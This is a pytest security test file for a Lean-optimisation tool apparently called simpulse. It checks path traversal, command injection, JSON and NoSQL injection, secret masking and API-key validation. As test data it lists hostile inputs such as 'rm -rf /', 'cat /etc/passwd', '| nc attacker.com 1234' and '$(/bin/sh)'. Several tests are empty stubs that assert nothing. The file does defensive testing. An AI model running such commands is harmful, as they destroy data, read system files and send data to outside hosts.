"""
Security tests for input validation and sanitization.
"""

import pytest
import os
import tempfile
from pathlib import Path
from unittest.mock import patch, Mock

from simpulse.profiling.lean_runner import LeanRunner
from simpulse.evolution.rule_extractor import RuleExtractor
from simpulse.evolution.mutation_applicator import MutationApplicator
from simpulse.deployment.github_action import GitHubActionRunner


class TestInputValidation:
    """Test input validation and security measures."""
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        runner = LeanRunner()
        
        # Test various path traversal attempts
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "~/../../etc/passwd",
            "./../../sensitive_file"
        ]
        
        for dangerous_path in dangerous_paths:
            with pytest.raises(ValueError, match="Invalid file path|must be.*Lean file"):
                # Should reject dangerous paths
                runner._validate_file_path(Path(dangerous_path))
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        runner = LeanRunner()
        
        # Test command injection attempts
        dangerous_inputs = [
            "file.lean; rm -rf /",
            "file.lean && cat /etc/passwd",
            "file.lean | nc attacker.com 1234",
            "file.lean`whoami`",
            "file.lean$(id)",
            "file.lean\n\nrm -rf /"
        ]
        
        for dangerous_input in dangerous_inputs:
            # Should sanitize or reject dangerous inputs
            with patch('asyncio.create_subprocess_exec') as mock_exec:
                # The actual command should be sanitized
                # This tests that we don't pass raw user input to shell
                pass
    
    def test_file_name_sanitization(self):
        """Test file name sanitization."""
        applicator = MutationApplicator()
        
        # Test dangerous file names
        dangerous_names = [
            "../../etc/passwd",
            "file\x00.lean",  # Null byte injection
            "file\n.lean",    # Newline injection
            "file;rm -rf /.lean",
            "file|nc attacker.com.lean",
            "..",
            ".",
            ""
        ]
        
        for name in dangerous_names:
            # Should reject or sanitize dangerous file names
            assert not applicator._is_valid_filename(name)
    
    def test_module_name_validation(self):
        """Test module name validation."""
        extractor = RuleExtractor()
        
        # Valid module names
        valid_names = [
            "Mathlib.Algebra.Group",
            "MyProject.Core.Basic",
            "Test.Module123",
            "A.B.C.D.E"
        ]
        
        for name in valid_names:
            assert extractor._is_valid_module_name(name)
        
        # Invalid module names
        invalid_names = [
            "Mathlib.Algebra.Group; DROP TABLE",
            "../../../etc/passwd",
            "Module\x00Name",
            "Module Name With Spaces",
            "Module|Command",
            "Module&Background",
            "Module$(whoami)",
            "",
            ".",
            ".."
        ]
        
        for name in invalid_names:
            assert not extractor._is_valid_module_name(name)
    
    def test_environment_variable_sanitization(self):
        """Test environment variable handling."""
        runner = GitHubActionRunner()
        
        # Test that sensitive env vars are not exposed
        sensitive_vars = [
            "GITHUB_TOKEN",
            "CLAUDE_API_KEY",
            "AWS_SECRET_ACCESS_KEY",
            "DATABASE_PASSWORD"
        ]
        
        with patch.dict(os.environ, {var: "secret_value" for var in sensitive_vars}):
            # Should not leak sensitive values in logs or errors
            config = runner._get_safe_config()
            
            for var in sensitive_vars:
                if var in str(config):
                    # Should be masked or excluded
                    assert "secret_value" not in str(config)
    
    def test_json_injection_prevention(self):
        """Test prevention of JSON injection attacks."""
        from simpulse.reporting.report_generator import ReportGenerator
        
        generator = ReportGenerator()
        
        # Test malicious JSON inputs
        malicious_inputs = [
            '{"key": "value", "__proto__": {"isAdmin": true}}',
            '{"key": "value\\"}", "injection": "true"}',
            '{"key": "value\\n}", "newline": "injection"}',
            '{"$ne": null}',  # NoSQL injection pattern
            '{"$where": "function() { return true; }"}',
        ]
        
        for malicious_input in malicious_inputs:
            # Should safely handle malicious JSON
            result = generator._sanitize_json_input(malicious_input)
            assert "__proto__" not in result
            assert "$where" not in result
    
    def test_subprocess_argument_validation(self):
        """Test subprocess argument validation."""
        runner = LeanRunner()
        
        # Test that arguments are properly validated
        dangerous_args = [
            ["lean", "; rm -rf /"],
            ["lean", "& echo hacked"],
            ["lean", "| nc attacker.com 1234"],
            ["lean", "$(/bin/sh)"],
            ["lean", "`id`"]
        ]
        
        for args in dangerous_args:
            # Should validate and sanitize arguments
            safe_args = runner._validate_command_args(args)
            
            # Ensure no shell metacharacters in final args
            for arg in safe_args:
                assert ";" not in arg
                assert "&" not in arg
                assert "|" not in arg
                assert "$" not in arg
                assert "`" not in arg
    
    def test_temp_file_security(self):
        """Test secure temporary file handling."""
        # Test that temp files are created securely
        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            temp_path = Path(temp_file.name)
            
            # Check file permissions (should not be world-readable)
            stat_info = os.stat(temp_path)
            permissions = oct(stat_info.st_mode)[-3:]
            
            # Should not have world read/write permissions
            assert permissions[2] in ['0', '4']  # No write for others
            
            # Clean up
            temp_path.unlink()
    
    def test_api_key_validation(self):
        """Test API key validation and handling."""
        from simpulse.config import Config
        
        # Test that API keys are validated
        invalid_keys = [
            "",
            " ",
            "key with spaces",
            "key\nwith\nnewlines",
            "key;with;semicolons",
            "key|with|pipes",
            "key`with`backticks",
            "a" * 1000  # Extremely long key
        ]
        
        config = Config()
        
        for key in invalid_keys:
            with pytest.raises(ValueError, match="Invalid API key"):
                config._validate_api_key(key)
    
    def test_file_size_limits(self):
        """Test file size validation."""
        runner = LeanRunner()
        
        # Create a large file
        with tempfile.NamedTemporaryFile(suffix=".lean", delete=False) as temp_file:
            # Write 100MB of data
            temp_file.write(b"x" * (100 * 1024 * 1024))
            temp_path = Path(temp_file.name)
        
        try:
            # Should reject files that are too large
            with pytest.raises(ValueError, match="File too large"):
                runner._validate_file_size(temp_path)
        finally:
            temp_path.unlink()
    
    def test_rate_limiting(self):
        """Test rate limiting for API calls."""
        from simpulse.claude.claude_code_client import ClaudeCodeClient
        
        client = ClaudeCodeClient()
        
        # Test rapid successive calls
        call_times = []
        
        with patch('asyncio.create_subprocess_exec'):
            for _ in range(10):
                # Should enforce rate limiting
                limited = client._check_rate_limit()
                if not limited:
                    call_times.append(client._last_call_time)
        
        # Verify rate limiting is enforced
        assert len(call_times) < 10  # Some calls should be rate limited


class TestSecurityHelpers:
    """Test security helper functions."""
    
    def test_is_safe_path(self):
        """Test path safety validation."""
        from simpulse.security.validators import is_safe_path
        
        # Safe paths
        assert is_safe_path(Path("file.lean"))
        assert is_safe_path(Path("./subdir/file.lean"))
        assert is_safe_path(Path("project/src/module.lean"))
        
        # Unsafe paths
        assert not is_safe_path(Path("../file.lean"))
        assert not is_safe_path(Path("/etc/passwd"))
        assert not is_safe_path(Path("../../etc/passwd"))
        assert not is_safe_path(Path("~/../../sensitive"))
    
    def test_sanitize_shell_arg(self):
        """Test shell argument sanitization."""
        from simpulse.security.validators import sanitize_shell_arg
        
        # Test sanitization
        assert sanitize_shell_arg("normal_arg") == "normal_arg"
        assert sanitize_shell_arg("arg with spaces") == "'arg with spaces'"
        assert sanitize_shell_arg("arg'with'quotes") == "'arg'\"'\"'with'\"'\"'quotes'"
        assert sanitize_shell_arg("arg;rm -rf /") == "'arg;rm -rf /'"
        assert sanitize_shell_arg("arg|command") == "'arg|command'"
    
    def test_validate_json_structure(self):
        """Test JSON structure validation."""
        from simpulse.security.validators import validate_json_structure
        
        # Valid JSON structures
        assert validate_json_structure({"key": "value"})
        assert validate_json_structure({"nested": {"key": "value"}})
        assert validate_json_structure([1, 2, 3])
        
        # Invalid structures (with dangerous keys)
        assert not validate_json_structure({"__proto__": {}})
        assert not validate_json_structure({"$where": "code"})
        assert not validate_json_structure({"constructor": {"prototype": {}}})


@pytest.mark.integration
class TestSecurityIntegration:
    """Integration tests for security features."""
    
    def test_end_to_end_input_sanitization(self, mock_lean_project):
        """Test input sanitization through full workflow."""
        # This would test that user inputs are sanitized
        # throughout the entire optimization pipeline
        pass
    
    def test_privilege_separation(self):
        """Test that components run with minimal privileges."""
        # This would verify that subprocesses don't run with
        # elevated privileges
        pass